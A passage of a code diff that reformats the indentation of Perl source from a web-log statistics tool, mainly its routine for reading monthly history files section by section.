-		 || $PluginsLoaded{'init'}{'geoipfree'} )
+	if (   $PluginsLoaded{'init'}{'geoip'}
+		|| $PluginsLoaded{'init'}{'geoipfree'} )
 	{
 		$Message[17] = $Message[25] = $Message[148];
 	}
@@ -3238,32 +3288,32 @@ sub Read_History_With_TmpUpdate {
 	my $lastlinechecksum = shift || 0;
 
 	my %allsections = (
-						'general'               => 1,
-						'misc'                  => 2,
-						'time'                  => 3,
-						'visitor'               => 4,
-						'day'                   => 5,
-						'domain'                => 6,
-						'cluster'               => 7,
-						'login'                 => 8,
-						'robot'                 => 9,
-						'worms'                 => 10,
-						'emailsender'           => 11,
-						'emailreceiver'         => 12,
-						'session'               => 13,
-						'sider'                 => 14,
-						'filetypes'             => 15,
-						'os'                    => 16,
-						'browser'               => 17,
-						'screensize'            => 18,
-						'unknownreferer'        => 19,
-						'unknownrefererbrowser' => 20,
-						'origin'                => 21,
-						'sereferrals'           => 22,
-						'pagerefs'              => 23,
-						'searchwords'           => 24,
-						'keywords'              => 25,
-						'errors'                => 26
+		'general'               => 1,
+		'misc'                  => 2,
+		'time'                  => 3,
+		'visitor'               => 4,
+		'day'                   => 5,
+		'domain'                => 6,
+		'cluster'               => 7,
+		'login'                 => 8,
+		'robot'                 => 9,
+		'worms'                 => 10,
+		'emailsender'           => 11,
+		'emailreceiver'         => 12,
+		'session'               => 13,
+		'sider'                 => 14,
+		'filetypes'             => 15,
+		'os'                    => 16,
+		'browser'               => 17,
+		'screensize'            => 18,
+		'unknownreferer'        => 19,
+		'unknownrefererbrowser' => 20,
+		'origin'                => 21,
+		'sereferrals'           => 22,
+		'pagerefs'              => 23,
+		'searchwords'           => 24,
+		'keywords'              => 25,
+		'errors'                => 26
 	);
 
 	my $order = ( scalar keys %allsections ) + 1;
@@ -3280,7 +3330,8 @@ sub Read_History_With_TmpUpdate {
 	my $readvisitorforbackward = 0;
 
 	if ($Debug) {
-		debug(    "Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]"
+		debug(
+"Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]"
 		);
 	}
 	if ($Debug) { debug("date=$date"); }
@@ -3294,110 +3345,110 @@ sub Read_History_With_TmpUpdate {
 		# When
 		$SectionsToLoad{'time'} = $order
 		  ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowHostsStats )
-			 || $HTMLOutput{'allhosts'}
-			 || $HTMLOutput{'lasthosts'}
-			 || $HTMLOutput{'unknownip'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowHostsStats )
+			|| $HTMLOutput{'allhosts'}
+			|| $HTMLOutput{'lasthosts'}
+			|| $HTMLOutput{'unknownip'} )
 		{
 			$SectionsToLoad{'visitor'} = $order++;
 		}     # Must be before day, sider and session section
 		if (
-			    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'}
-				  && ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )
-			 || $HTMLOutput{'alldays'}
+			   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'}
+				&& ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )
+			|| $HTMLOutput{'alldays'}
 		  )
 		{
 			$SectionsToLoad{'day'} = $order++;
 		}
 
 		# Who
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowDomainsStats )
-			 || $HTMLOutput{'alldomains'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowDomainsStats )
+			|| $HTMLOutput{'alldomains'} )
 		{
 			$SectionsToLoad{'domain'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )
-			 || $HTMLOutput{'alllogins'}
-			 || $HTMLOutput{'lastlogins'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )
+			|| $HTMLOutput{'alllogins'}
+			|| $HTMLOutput{'lastlogins'} )
 		{
 			$SectionsToLoad{'login'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowRobotsStats )
-			 || $HTMLOutput{'allrobots'}
-			 || $HTMLOutput{'lastrobots'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowRobotsStats )
+			|| $HTMLOutput{'allrobots'}
+			|| $HTMLOutput{'lastrobots'} )
 		{
 			$SectionsToLoad{'robot'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowWormsStats )
-			 || $HTMLOutput{'allworms'}
-			 || $HTMLOutput{'lastworms'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowWormsStats )
+			|| $HTMLOutput{'allworms'}
+			|| $HTMLOutput{'lastworms'} )
 		{
 			$SectionsToLoad{'worms'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowEMailSenders )
-			 || $HTMLOutput{'allemails'}
-			 || $HTMLOutput{'lastemails'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowEMailSenders )
+			|| $HTMLOutput{'allemails'}
+			|| $HTMLOutput{'lastemails'} )
 		{
 			$SectionsToLoad{'emailsender'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowEMailReceivers )
-			 || $HTMLOutput{'allemailr'}
-			 || $HTMLOutput{'lastemailr'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowEMailReceivers )
+			|| $HTMLOutput{'allemailr'}
+			|| $HTMLOutput{'lastemailr'} )
 		{
 			$SectionsToLoad{'emailreceiver'} = $order++;
 		}
 
 		# Navigation
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowSessionsStats )
-			 || $HTMLOutput{'sessions'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowSessionsStats )
+			|| $HTMLOutput{'sessions'} )
 		{
 			$SectionsToLoad{'session'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowPagesStats )
-			 || $HTMLOutput{'urldetail'}
-			 || $HTMLOutput{'urlentry'}
-			 || $HTMLOutput{'urlexit'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowPagesStats )
+			|| $HTMLOutput{'urldetail'}
+			|| $HTMLOutput{'urlentry'}
+			|| $HTMLOutput{'urlexit'} )
 		{
 			$SectionsToLoad{'sider'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowFileTypesStats )
-			 || $HTMLOutput{'filetypes'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowFileTypesStats )
+			|| $HTMLOutput{'filetypes'} )
 		{
 			$SectionsToLoad{'filetypes'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowOSStats )
-			 || $HTMLOutput{'osdetail'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowOSStats )
+			|| $HTMLOutput{'osdetail'} )
 		{
 			$SectionsToLoad{'os'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowBrowsersStats )
-			 || $HTMLOutput{'browserdetail'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowBrowsersStats )
+			|| $HTMLOutput{'browserdetail'} )
 		{
 			$SectionsToLoad{'browser'} = $order++;
 		}
@@ -3407,40 +3458,40 @@ sub Read_History_With_TmpUpdate {
 		if ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {
 			$SectionsToLoad{'unknownrefererbrowser'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )
 		{
 			$SectionsToLoad{'screensize'} = $order++;
 		}
 
 		# Referers
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowOriginStats )
-			 || $HTMLOutput{'origin'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
+			|| $HTMLOutput{'origin'} )
 		{
 			$SectionsToLoad{'origin'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowOriginStats )
-			 || $HTMLOutput{'refererse'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
+			|| $HTMLOutput{'refererse'} )
 		{
 			$SectionsToLoad{'sereferrals'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowOriginStats )
-			 || $HTMLOutput{'refererpages'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowOriginStats )
+			|| $HTMLOutput{'refererpages'} )
 		{
 			$SectionsToLoad{'pagerefs'} = $order++;
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )
-			 || $HTMLOutput{'keyphrases'}
-			 || $HTMLOutput{'keywords'} )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )
+			|| $HTMLOutput{'keyphrases'}
+			|| $HTMLOutput{'keywords'} )
 		{
 			$SectionsToLoad{'searchwords'} = $order++;
 		}
@@ -3448,18 +3499,18 @@ sub Read_History_With_TmpUpdate {
 			$SectionsToLoad{'keywords'} = $order++;
 		}    # If we update, dont need to load
 		     # Others
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowMiscStats ) )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowMiscStats ) )
 		{
 			$SectionsToLoad{'misc'} = $order++;
 		}
 		if (
-			    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'}
-				  && ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )
-			 || $HTMLOutput{'errors'}
+			   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'}
+				&& ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )
+			|| $HTMLOutput{'errors'}
 		  )
 		{
 			$SectionsToLoad{'errors'} = $order++;
@@ -3469,17 +3520,17 @@ sub Read_History_With_TmpUpdate {
 				$SectionsToLoad{"sider_$_"} = $order++;
 			}
 		}
-		if (    $UpdateStats
-			 || $MigrateStats
-			 || ( $HTMLOutput{'main'} && $ShowClusterStats ) )
+		if (   $UpdateStats
+			|| $MigrateStats
+			|| ( $HTMLOutput{'main'} && $ShowClusterStats ) )
 		{
 			$SectionsToLoad{'cluster'} = $order++;
 		}
 		foreach ( 1 .. @ExtraName - 1 ) {
-			if (    $UpdateStats
-				 || $MigrateStats
-				 || ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )
-				 || $HTMLOutput{"allextra$_"} )
+			if (   $UpdateStats
+				|| $MigrateStats
+				|| ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )
+				|| $HTMLOutput{"allextra$_"} )
 			{
 				$SectionsToLoad{"extra_$_"} = $order++;
 			}
@@ -3511,26 +3562,26 @@ sub Read_History_With_TmpUpdate {
 
 	if ($Debug) {
 		debug(
-			   " List of sections marked for load : "
-				 . join(
-						 ' ',
-						 (
-							sort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }
-							  keys %SectionsToLoad
-						 )
-				 ),
-			   2
+			" List of sections marked for load : "
+			  . join(
+				' ',
+				(
+					sort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }
+					  keys %SectionsToLoad
+				)
+			  ),
+			2
 		);
 		debug(
-			   " List of sections marked for save : "
-				 . join(
-						 ' ',
-						 (
-							sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
-							  keys %SectionsToSave
-						 )
-				 ),
-			   2
+			" List of sections marked for save : "
+			  . join(
+				' ',
+				(
+					sort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }
+					  keys %SectionsToSave
+				)
+			  ),
+			2
 		);
 	}
 
@@ -3538,7 +3589,7 @@ sub Read_History_With_TmpUpdate {
 	my $filetowrite = '';
 	my $filetoread  = '';
 	if ( $HistoryAlreadyFlushed{"$year$month$day$hour"}
-		 && -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$" )
+		&& -s "$DirData/$PROG$filedate$FileSuffix.tmp.$$" )
 	{
 
 		# tmp history file was already flushed
@@ -3558,7 +3609,7 @@ sub Read_History_With_TmpUpdate {
 	if ($withread) {
 		open( HISTORY, $filetoread )
 		  || error( "Couldn't open file \"$filetoread\" for read: $!",
-					"", "", $MigrateStats );
+			"", "", $MigrateStats );
 		binmode HISTORY
 		  ; # Avoid premature EOF due to history files corrupted with \cZ or bin chars
 	}
@@ -3629,7 +3680,7 @@ sub Read_History_With_TmpUpdate {
 			if ( $field[0] eq 'FirstTime' || $field[0] eq "${xmlrb}FirstTime" )
 			{
 				if ( !$FirstTime{$date}
-					 || $FirstTime{$date} > int( $field[1] ) )
+					|| $FirstTime{$date} > int( $field[1] ) )
 				{
 					$FirstTime{$date} = int( $field[1] );
 				}
@@ -3642,38 +3693,38 @@ sub Read_History_With_TmpUpdate {
 				}
 				next;
 			}
-			if ($field[0] eq 'LastUpdate'
-				 || $field[0] eq "${xmlrb}LastUpdate")
+			if (   $field[0] eq 'LastUpdate'
+				|| $field[0] eq "${xmlrb}LastUpdate" )
 			{
-				if (! $LastUpdate) { $LastUpdate=int($field[1]); }; 
+				if ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }
 				next;
 			}
-			if (    $field[0] eq 'TotalVisits'
-				 || $field[0] eq "${xmlrb}TotalVisits" )
+			if (   $field[0] eq 'TotalVisits'
+				|| $field[0] eq "${xmlrb}TotalVisits" )
 			{
 				if ( !$withupdate ) {
 					$MonthVisits{ $year . $month } += int( $field[1] );
 				}
 				next;
 			}
-			if (    $field[0] eq 'TotalUnique'
-				 || $field[0] eq "${xmlrb}TotalUnique" )
+			if (   $field[0] eq 'TotalUnique'
+				|| $field[0] eq "${xmlrb}TotalUnique" )
 			{
 				if ( !$withupdate ) {
 					$MonthUnique{ $year . $month } += int( $field[1] );
 				}
 				next;
 			}
-			if (    $field[0] eq 'MonthHostsKnown'
-				 || $field[0] eq "${xmlrb}MonthHostsKnown" )
+			if (   $field[0] eq 'MonthHostsKnown'
+				|| $field[0] eq "${xmlrb}MonthHostsKnown" )
 			{
 				if ( !$withupdate ) {
 					$MonthHostsKnown{ $year . $month } += int( $field[1] );
 				}
 				next;
 			}
-			if (    $field[0] eq 'MonthHostsUnknown'
-				 || $field[0] eq "${xmlrb}MonthHostsUnknown" )
+			if (   $field[0] eq 'MonthHostsUnknown'
+				|| $field[0] eq "${xmlrb}MonthHostsUnknown" )
 			{
 				if ( !$withupdate ) {
 					$MonthHostsUnknown{ $year . $month } += int( $field[1] );
@@ -3681,10 +3732,10 @@ sub Read_History_With_TmpUpdate {
 				next;
 			}
 			if (
-				 (
-				      $field[0] eq 'END_GENERAL'
-				   || $field[0] eq "${xmleb}END_GENERAL"
-				 )
+				(
+					   $field[0] eq 'END_GENERAL'
+					|| $field[0] eq "${xmleb}END_GENERAL"
+				)
 			  )
 			{
 				if ($Debug) { debug(" End of GENERAL section"); }
@@ -3699,7 +3750,7 @@ sub Read_History_With_TmpUpdate {
 				delete $SectionsToLoad{'general'};
 				if ( $SectionsToSave{'general'} ) {
 					Save_History( 'general', $year, $month, $date, $lastlinenb,
-								  $lastlineoffset, $lastlinechecksum );
+						$lastlineoffset, $lastlinechecksum );
 					delete $SectionsToSave{'general'};
 				}
 				if ( !scalar %SectionsToLoad ) {
@@ -3735,14 +3786,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_MISC'
-							|| $field[0] eq "${xmleb}END_MISC"
-							|| !$_ );
-				if (    $field[0] ne 'END_MISC'
-					 && $field[0] ne "${xmleb}END_MISC" )
+				  } until ( $field[0] eq 'END_MISC'
+					  || $field[0] eq "${xmleb}END_MISC"
+					  || !$_ );
+				if (   $field[0] ne 'END_MISC'
+					&& $field[0] ne "${xmleb}END_MISC" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section MISC not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -3750,7 +3801,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of MISC section ($count entries, $countloaded loaded)"
+					debug(
+" End of MISC section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'misc'};
@@ -3796,14 +3848,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_CLUSTER'
-							|| $field[0] eq "${xmleb}END_CLUSTER"
-							|| !$_ );
-				if (    $field[0] ne 'END_CLUSTER'
-					 && $field[0] ne "${xmleb}END_CLUSTER" )
+				  } until ( $field[0] eq 'END_CLUSTER'
+					  || $field[0] eq "${xmleb}END_CLUSTER"
+					  || !$_ );
+				if (   $field[0] ne 'END_CLUSTER'
+					&& $field[0] ne "${xmleb}END_CLUSTER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section CLUSTER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -3811,7 +3863,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of CLUSTER section ($count entries, $countloaded loaded)"
+					debug(
+" End of CLUSTER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'cluster'};
@@ -3849,9 +3902,9 @@ sub Read_History_With_TmpUpdate {
 					{    # Test on ne '' because field[0] is '0' for hour 0)
 						$count++;
 						if ( $SectionsToLoad{'time'} ) {
-							if (    $withupdate
-								 || $MonthRequired eq 'all'
-								 || $MonthRequired eq "$month" )
+							if (   $withupdate
+								|| $MonthRequired eq 'all'
+								|| $MonthRequired eq "$month" )
 							{    # Still required
 								$countloaded++;
 								if ( $field[1] ) {
@@ -3888,14 +3941,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_TIME'
-							|| $field[0] eq "${xmleb}END_TIME"
-							|| !$_ );
-				if (    $field[0] ne 'END_TIME'
-					 && $field[0] ne "${xmleb}END_TIME" )
+				  } until ( $field[0] eq 'END_TIME'
+					  || $field[0] eq "${xmleb}END_TIME"
+					  || !$_ );
+				if (   $field[0] ne 'END_TIME'
+					&& $field[0] ne "${xmleb}END_TIME" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section TIME not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -3903,7 +3956,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of TIME section ($count entries, $countloaded loaded)"
+					debug(
+" End of TIME section ($count entries, $countloaded loaded)"
 					);
 				}
 				$MonthPages{ $year . $month }          += $monthpages;
@@ -3973,14 +4027,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_ORIGIN'
-							|| $field[0] eq "${xmleb}END_ORIGIN"
-							|| !$_ );
-				if (    $field[0] ne 'END_ORIGIN'
-					 && $field[0] ne "${xmleb}END_ORIGIN" )
+				  } until ( $field[0] eq 'END_ORIGIN'
+					  || $field[0] eq "${xmleb}END_ORIGIN"
+					  || !$_ );
+				if (   $field[0] ne 'END_ORIGIN'
+					&& $field[0] ne "${xmleb}END_ORIGIN" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section ORIGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -3988,7 +4042,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of ORIGIN section ($count entries, $countloaded loaded)"
+					debug(
+" End of ORIGIN section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'origin'};
@@ -4033,12 +4088,12 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_DAY'
-							|| $field[0] eq "${xmleb}END_DAY"
-							|| !$_ );
+				  } until ( $field[0] eq 'END_DAY'
+					  || $field[0] eq "${xmleb}END_DAY"
+					  || !$_ );
 				if ( $field[0] ne 'END_DAY' && $field[0] ne "${xmleb}END_DAY" )
 				{
 					error(
@@ -4047,7 +4102,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of DAY section ($count entries, $countloaded loaded)"
+					debug(
+" End of DAY section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'day'};
@@ -4080,8 +4136,8 @@ sub Read_History_With_TmpUpdate {
 								$MonthUnique{ $year . $month }++;
 							}
 							if ( $MonthRequired ne 'all' ) {
-								if (    $field[0] !~ /^\d+\.\d+\.\d+\.\d+$/
-									 && $field[0] !~ /^[0-9A-F]*:/i )
+								if (   $field[0] !~ /^\d+\.\d+\.\d+\.\d+$/
+									&& $field[0] !~ /^[0-9A-F]*:/i )
 								{
 									$MonthHostsKnown{ $year . $month }++;
 								}
@@ -4093,14 +4149,16 @@ sub Read_History_With_TmpUpdate {
 						if ( $withupdate && $_waithost_e{ $field[0] } ) {
 							my $timehostl = int( $field[4] || 0 );
 							my $timehosts = int( $field[5] || 0 );
-							my $newtimehosts =
-							  (   $_waithost_s{ $field[0] }
+							my $newtimehosts = (
+								  $_waithost_s{ $field[0] }
 								? $_waithost_s{ $field[0] }
-								: $_host_s{ $field[0] } );
-							my $newtimehostl =
-							  (   $_waithost_l{ $field[0] }
+								: $_host_s{ $field[0] }
+							);
+							my $newtimehostl = (
+								  $_waithost_l{ $field[0] }
 								? $_waithost_l{ $field[0] }
-								: $_host_l{ $field[0] } );
+								: $_host_l{ $field[0] }
+							);
 							if ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {
 								if ($Debug) {
 									debug(
@@ -4115,7 +4173,7 @@ sub Read_History_With_TmpUpdate {
 								if ( $timehosts && $timehostl ) {
 									$_session{
 										GetSessionRange( $timehosts,
-														 $timehostl )
+											$timehostl )
 									  }++;
 								}
 								if ( $_waithost_s{ $field[0] } ) {
@@ -4123,7 +4181,7 @@ sub Read_History_With_TmpUpdate {
 	   # First session found in log was followed by another one so it's finished
 									$_session{
 										GetSessionRange( $newtimehosts,
-														 $newtimehostl )
+											$newtimehostl )
 									  }++;
 								}
 
@@ -4141,12 +4199,12 @@ sub Read_History_With_TmpUpdate {
 	   # First session found in log was followed by another one so it's finished
 									$_session{
 										GetSessionRange(
-												   MinimumButNoZero(
-													   $timehosts, $newtimehosts
-												   ),
-												   $timehostl > $newtimehostl
-												   ? $timehostl
-												   : $newtimehostl
+											MinimumButNoZero(
+												$timehosts, $newtimehosts
+											),
+											$timehostl > $newtimehostl
+											? $timehostl
+											: $newtimehostl
 										)
 									  }++;
 
@@ -4171,46 +4229,46 @@ sub Read_History_With_TmpUpdate {
 						}
 
 						# Load records
-						if (    $readvisitorforbackward != 2
-							 && $SectionsToLoad{'visitor'} )
+						if (   $readvisitorforbackward != 2
+							&& $SectionsToLoad{'visitor'} )
 						{    # if readvisitorforbackward==2 we do not load
 							my $loadrecord = 0;
 							if ($withupdate) {
 								$loadrecord = 1;
 							}
 							else {
-								if (    $HTMLOutput{'allhosts'}
-									 || $HTMLOutput{'lasthosts'} )
+								if (   $HTMLOutput{'allhosts'}
+									|| $HTMLOutput{'lasthosts'} )
 								{
 									if (
-										 (
-										   !$FilterIn{'host'}
-										   || $field[0] =~ /$FilterIn{'host'}/i
-										 )
-										 && ( !$FilterEx{'host'}
-											  || $field[0] !~
-											  /$FilterEx{'host'}/i )
+										(
+											!$FilterIn{'host'}
+											|| $field[0] =~ /$FilterIn{'host'}/i
+										)
+										&& ( !$FilterEx{'host'}
+											|| $field[0] !~
+											/$FilterEx{'host'}/i )
 									  )
 									{
 										$loadrecord = 1;
 									}
 								}
-								elsif (    $MonthRequired eq 'all'
-										|| $field[2] >= $MinHit{'Host'} )
+								elsif ($MonthRequired eq 'all'
+									|| $field[2] >= $MinHit{'Host'} )
 								{
 									if (
 										$HTMLOutput{'unknownip'}
 										&& ( $field[0] =~ /^\d+\.\d+\.\d+\.\d+$/
-											 || $field[0] =~ /^[0-9A-F]*:/i )
+											|| $field[0] =~ /^[0-9A-F]*:/i )
 									  )
 									{
 										$loadrecord = 1;
 									}
 									elsif (
-											$HTMLOutput{'main'}
-											&& (    $MonthRequired eq 'all'
-												 || $countloaded <
-												 $MaxNbOf{'HostsShown'} )
+										$HTMLOutput{'main'}
+										&& (   $MonthRequired eq 'all'
+											|| $countloaded <
+											$MaxNbOf{'HostsShown'} )
 									  )
 									{
 										$loadrecord = 1;
@@ -4233,13 +4291,13 @@ sub Read_History_With_TmpUpdate {
 									if ($withupdate)
 									{ # field[5] field[6] are used only for update
 										if ( $field[5]
-											 && !$_host_s{ $field[0] } )
+											&& !$_host_s{ $field[0] } )
 										{
 											$_host_s{ $field[0] } =
 											  int( $field[5] );
 										}
 										if ( $field[6]
-											 && !$_host_u{ $field[0] } )
+											&& !$_host_u{ $field[0] } )
 										{
 											$_host_u{ $field[0] } = $field[6];
 										}
@@ -4253,14 +4311,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_VISITOR'
-							|| $field[0] eq "${xmleb}END_VISITOR"
-							|| !$_ );
-				if (    $field[0] ne 'END_VISITOR'
-					 && $field[0] ne "${xmleb}END_VISITOR" )
+				  } until ( $field[0] eq 'END_VISITOR'
+					  || $field[0] eq "${xmleb}END_VISITOR"
+					  || !$_ );
+				if (   $field[0] ne 'END_VISITOR'
+					&& $field[0] ne "${xmleb}END_VISITOR" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section VISITOR not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4268,7 +4326,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of VISITOR section ($count entries, $countloaded loaded)"
+					debug(
+" End of VISITOR section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'visitor'};
@@ -4304,14 +4363,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_UNKNOWNIP'
-							|| $field[0] eq "${xmleb}END_UNKNOWNIP"
-							|| !$_ );
-				if (    $field[0] ne 'END_UNKNOWNIP'
-					 && $field[0] ne "${xmleb}END_UNKNOWNIP" )
